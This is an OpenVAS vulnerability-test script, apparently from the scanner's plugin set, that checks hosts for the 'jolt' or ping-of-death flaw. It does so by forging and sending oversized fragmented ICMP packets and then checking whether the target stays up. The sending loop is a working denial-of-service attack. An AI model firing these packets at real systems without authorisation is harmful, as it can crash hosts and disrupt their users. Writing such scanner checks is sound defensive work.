###############################################################################
# OpenVAS Vulnerability Test
# $Id: jolt.nasl 10411 2018-07-05 10:15:10Z cfischer $
#
# ping of death
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11903");
  script_version("$Revision: 10411 $");
  script_tag(name:"last_modification", value:"$Date: 2018-07-05 12:15:10 +0200 (Thu, 05 Jul 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_name("ping of death");
  script_category(ACT_KILL_HOST);
  script_copyright("This script is Copyright (C) 2003 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("global_settings.nasl");
  script_exclude_keys("keys/TARGET_IS_IPV6");

  script_tag(name:"solution", value:"Contact your operating system vendor for a patch.");

  script_tag(name:"impact", value:"An attacker may use this flaw to shut down this server,
  thus preventing you from working properly.");

  script_tag(name:"summary", value:"The machine crashed when pinged with an incorrectly fragmented packet.
  This is known as the 'jolt' or 'ping of death' denial of service attack.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

if( TARGET_IS_IPV6() ) exit( 0 );

# Ensure that the host is still up
start_denial();
sleep( 2 );
up = end_denial();
if( ! up ) exit( 0 );

id = rand() % 65536;

if( ! mtu ) mtu = 1500;
maxdata = mtu - 20 - 8; # IP + ICMP
maxdata = maxdata / 8; maxdata = maxdata * 8;
if( maxdata < 16 ) maxdata = 544;

dl = 65535 / ( mtu - 20 );
dl ++;
dl *= maxdata;

src = this_host();

id = rand() % 65535 + 1;
seq = rand() % 256;

start_denial();
for( j = 0; j < dl; j = j + maxdata) {
  datalen = dl - j;
  o = j / 8;
  if( datalen > maxdata ) {
    o = o | 0x2000;
    datalen = maxdata;
  }

  ##display(string("j=", j, "; o=", o, ";dl=", datalen, "\n"));
  ip = forge_ip_packet( ip_v:4, ip_hl:5, ip_tos:0, ip_off:o,
                        ip_p:IPPROTO_ICMP, ip_id:id, ip_ttl:0x40,
                        ip_src:src );
  icmp = forge_icmp_packet( ip:ip, icmp_type:8, icmp_code:0,
                            icmp_seq:seq, icmp_id:seq, data:crap( datalen - 8 ) );
  send_packet( icmp, pcap_active:FALSE );
}

alive = end_denial();
if( ! alive ) {
  security_message( port:0, proto:"icmp" );
  set_kb_item( name:"Host/dead", value:TRUE );
  exit( 0 );
}

exit( 99 );
